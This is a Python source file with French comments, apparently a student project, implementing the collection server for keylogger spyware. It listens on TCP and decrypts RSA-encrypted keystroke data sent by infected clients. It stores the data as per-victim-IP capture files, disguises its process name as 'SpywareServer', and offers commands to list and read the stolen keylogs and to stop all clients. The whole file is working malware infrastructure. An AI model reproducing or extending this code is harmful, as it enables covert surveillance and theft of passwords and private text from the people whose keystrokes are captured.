from collections.abc import Callable, Iterable, Mapping
import socket
import datetime
import argparse
import time
import sys
import os
from pathlib import Path
import signal
from typing import Any
import psutil
import setproctitle
from threading import Thread
from functools import partial
import rsa

# Arguments 

parser = argparse.ArgumentParser()
group = parser.add_mutually_exclusive_group()
group.add_argument("-l", "--listen", type=int, help="listens on the TCP port entered by the user and waits for the spyware data.")
group.add_argument("-s", "--show", help="displays the list of files received by the program.", action="store_true")
group.add_argument("-r", "--readfile", type=str, help="displays the content of a keylog file.")
group.add_argument("-k", "--kill", help="stop all the instances of the server and stop all the clients.", action="store_true")
args = parser.parse_args()


#Chemin vers le dossier captures qui contient les fichiers txt
path_captures = "captures"


# Classe StoppableThread qui permet de créer un thread
class StoppableThread(Thread):
    def __init__(self, conn, addr, key):
        super(StoppableThread, self).__init__()
        self.running = True
        self.conn = conn
        self.addr = addr
        self.key = key
    
    def stop(self):
        self.running = False
    
    def run(self):

        return_code = ["OK"]


        while self.running:
            try:
        
                # Réception des données
                data = rsa.decrypt(self.conn.recv(1024), key).decode()

                # si la donnée reçue est vide, le client est mort
                if data == "":
                    print("client dead ?")
                    return_code[0] = "STOP"

                # si des données ont été réceptionnées
                if data:
                    handle_data(data, self.addr)

                    # renvoyer un code
                    if return_code[0] == "OK":
                        self.conn.send("OK".encode("utf-8"))

            except Exception as e:
                return_code[0] = "ERROR"
                print(f"Error Main : {e}")

            
        # déchiffrement des données
        data = rsa.decrypt(self.conn.recv(1024), key).decode()

        # si des données ont été réceptionnées
        if data:
            # traitement des données
            handle_data(data, self.addr)

            print("send stop code")
            self.conn.send("STOP".encode("utf-8"))

            # temps de pause pour éviter de couper la connexion au moment de l'envoi du code STOP
            time.sleep(1)
        # fermeture de la connexion
        self.conn.close()




# Fonctions

# Fonction qui permet de traiter les données reçues
def handle_data(data, addr):

    # Fic contient la liste des fichiers qui commencent par l'adresse IP du client
    fic = list(Path(path_captures).glob(f"{addr[0]}*.txt"))
    # filename contient le nom du fichier qui sera créé
    filename = Path(path_captures) / f"{addr[0]}-{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}-keyboard.txt"
    
    # Si le fichier n'existe pas, on le crée et on écrit les données dedans
    if fic == []:
        with open(filename, 'w') as file:
            file.write(data)
    # Sinon on écrit les données dans le fichier existant et on le renomme avec le timestamp mis à jour
    else:
        ficfilename = fic[0]
        with open(ficfilename, 'w') as file:
            file.write(data)
        os.rename(ficfilename,filename)

# Fonction qui permet d'afficher la liste des fichiers capturés
def display_files():
    files = os.listdir(Path(path_captures))
    print("List of files captured :")
    for file in files:
        print(" - " + file)
    
    if files == []:
        print("No files captured yet")


# Fonction qui permet de lire le contenu d'un fichier
def read_file(filename):
    try:
        # fic contient la liste des fichiers qui contiennent le nom du fichier entré par l'utilisateur
        fic = list(Path(path_captures).glob(f"*{filename}*"))

        # Si aucun fichier n'est trouvé, on affiche File not found
        if fic == []:
            print("File not found")

        # Si un seul fichier est trouvé, on affiche son contenu
        elif len(fic) == 1 :
            with open (fic[0], "r") as file:
                print(f"File content ({fic[0].name}) :")
                content = file.read()
                print(content)
        # Si plus de 5 fichiers sont trouvés, on affiche Too many files found
        elif len(fic) > 5 :
            print("Too many files found ! \nPlease be more specific")
        # Sinon on affiche la liste des fichiers trouvés et on demande à l'utilisateur lequel il veut lire
        else:
            print("Several files found :")

            for i in range(len(fic)):
                print(f"{i} - {fic[i].name}")

            while True:
                print("Which one do you want to read ?")
                index = int(input("Enter the index of the file you want to read : "))

                if 0 <= index < len(fic):
                    with open(fic[index], "r") as file:
                        print(f"File content ({fic[index].name}) :")
                        content = file.read()
                        print(content)
                    break

                else:
                    print("Invalid index")
                    
    except Exception as e:
        print(f"Error: {e}")




# Fonction qui permet de récupérer les instances du serveur
def get_server_instances():
    procs = []

    # itération sur tous les processus
    for proc in psutil.process_iter():
        if "SpywareServer" == proc.name():
            procs.append(proc.pid)
    # retourne la liste des processus qui ont le nom SpywareServer
    return procs


# Fonction qui permet d'arrêter le serveur
def stop_server(signal=None, frame=None, threads=None, socket_server=None):

    # Si des threads ont été créés, on les arrête
    if threads != None:
        for th in threads:
            th.stop()
    
    # Si le socket a été créé, on le ferme
    socket_server.close()

    print(f"stoping server. host : {host}")
    
    exit()


# Traitement
# Si l'argument listen est renseigné
if args.listen:
    # changement du nom du processus par SpywareServer
    setproctitle.setproctitle("SpywareServer")
    
    # Configuration du socket
    host = '192.168.0.35'
    port = args.listen

    # création et configuration du socket
    socket_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket_server.bind((host, port))
    socket_server.listen()

    print(f"Server listening on {host}:{port}")

    # chargement de la clé privée
    with open("rsa/private.pem", mode='rb') as f:
        key = rsa.PrivateKey.load_pkcs1(f.read())

    # création de la liste des threads
    threads = []

    # interception du signal SIGTERM
    partial_stop_server = partial(stop_server, threads=threads, socket_server=socket_server)
    signal.signal(signal.SIGTERM, partial_stop_server)


    while True:
        try:
            # récupération de la connexion
            # print("wait for connection")
            conn, addr = socket_server.accept()

            print("[+] Connexion acceptée")

            # création du thread
            th = StoppableThread(conn=conn, addr=addr, key=key)
            th.name = "SpywareThread"
            th.start()

            threads.append(th)
        

        # interception du KeyboardInterrupt
        except KeyboardInterrupt as e:
            answered = False
            
            while not answered:
                respons = input("[?] Voulez-vous vraiment arrêter le serveur ? (y/n) ")

                if respons == 'y' or respons == 'n':
                    answered = True

            if respons == 'n' or respons == 'N':
                # ne rien faire
                print("[+] Le serveur ne sera pas arrêté")


            else:
                # arrêter le serveur
                print("[+] Le serveur va s'arrêter")
                
                stop_server(threads=threads, socket_server=socket_server)


        except Exception as e:
            running = False
            print(f"Error Main : {e}")



# Si l'argument show est renseigné on affiche la liste des fichiers capturés
elif args.show:
    display_files()
    sys.exit()


# Si l'argument readfile est renseigné on affiche le contenu du fichier entré par l'utilisateur
elif args.readfile:
    read_file(args.readfile)
    sys.exit()


# Si l'argument kill est renseigné on arrête toutes les instances du serveur
elif args.kill:
    print("kill all the instances")
    
    # récupération des instances du serveur dans la liste procs
    procs = get_server_instances()

    print(f"{len(procs)} instances found")

    # itération sur les instances du serveur et arrêt de chaque instance
    for proc in procs:
        try:
            os.kill(proc, signal.SIGTERM)

        except Exception as e:
            print(f"Error while killing servers : {e}")



